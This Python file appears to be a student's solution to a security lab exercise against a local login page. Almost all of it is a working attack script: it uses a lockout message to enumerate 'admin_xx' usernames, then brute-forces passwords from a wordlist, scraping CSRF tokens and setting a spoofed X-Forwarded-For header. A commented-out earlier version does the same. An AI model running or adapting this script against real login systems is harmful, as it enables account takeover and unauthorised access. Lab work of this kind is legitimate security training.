# #!/usr/bin/python3
# import string, requests

# loginDetails = {
#     "username": "admin",
#     "password": "SecretPwd!" # Palceholder for password. Change to expected needs.
# }

# # Login URL
# loginUrl = "http://localhost:30000/"

# # Get the CSRF token. Optional but useful when CSRF tokens are necessary for websites.
# session = requests.Session()
# res = session.get(loginUrl)
# loginDetails["csrfmiddlewaretoken"] = res.text.split("csrfmiddlewaretoken\" value=\"")[-1].split("\"")[0]

# # Get all passwords from the password list
# passwords = list()
# with open("/home/labDirectory/passwords.lst", "rt") as f:
#     for line in f.readlines():
#         passwords.append(line.strip())

# # Create all possible admin usernames and store it in usernames list
# usernames = list()
# ########## Write code to create all possible admin usernames as per the problem statement here ##########
# # ...

# for char1 in range(0,26):
#   for char2 in range(1,26):
#     usernames.append('admin_'+chr(char1+ord('a'))+chr(char2+ord('a')))

# #########################################################################################################
# flag=False
# # Brute force the password
# for index,username in enumerate(usernames):
#   loginDetails['username']=username
#   flag=False
#   print('trying username: '+username)
#   for i in range(10):
    
#     print("username found: "+username)
#     res=session.post(loginUrl,data=loginDetails)
#     if 'Too many invalid login attempts' in res.text:
#       flag=True
#       print("username found: "+username)
#   if not flag:
#     continue;
#   for index,password in enumerate(passwords):
#     loginDetails['password']=password
#     res=session.post(loginUrl,data=loginDetails)
#     print()
#     if res.status_code==302:
#       print("attacck successful. username: "+username+"  password: "+password)
#       exit()


# #################################Alternative Solution########################################################################


import string, requests

# DO NOT CHANGE SECTION STARTS
# -----------------------------------------------------------

loginDetails = {
    "username": "admin",
    "password": "SecretPwd!" # Palceholder for password. Change to expected needs.
}

header={
    "X-Forwarded-For": "10.10.10.10" #Placeholder for client IP address
}

# Login URL
loginUrl = "http://localhost:30000/"

# Get the CSRF token. Important if the website uses CSRF tokens
session = requests.Session()
res = session.get(loginUrl)
loginDetails["csrfmiddlewaretoken"] = res.text.split("csrfmiddlewaretoken\" value=\"")[-1].split("\"")[0]

# Get all passwords from the password list
data = list()
with open("/home/labDirectory/passwords.lst", "rt") as f:
    for line in f.readlines():
        data.append(line.strip())

def printFinalOutput(password):
    print(f"\t[+] Found a valid username:password pair--> admin:{password}")

# -----------------------------------------------------------
# DO NOT CHANGE SECTION ENDS


# Brute force the password
# try 10 times to get the error saying 

list1=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
list2=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
for i in range(0,26):
    for j in range(0,26):
        for _ in range(0,7):
            loginDetails["username"]="admin_"+list1[i]+list1[j];
            print('trying username : '+loginDetails["username"])
            res=session.post(loginUrl,data=loginDetails)
#             print(res.text)
            if "Too many invalid login attempts" in res.text:
                print("username is : "+loginDetails["username"]);
                for password in data:
                    loginDetails["password"]=password
                    res=session.post(loginUrl,data=loginDetails)
                    if "Too many invalid login attempts" not in res.text and 'Incorrect Username or Password' not in res.text:
                        print("username is: "+loginDetails["username"])
                        print("password is: "+loginDetails["password"])
                exit(0);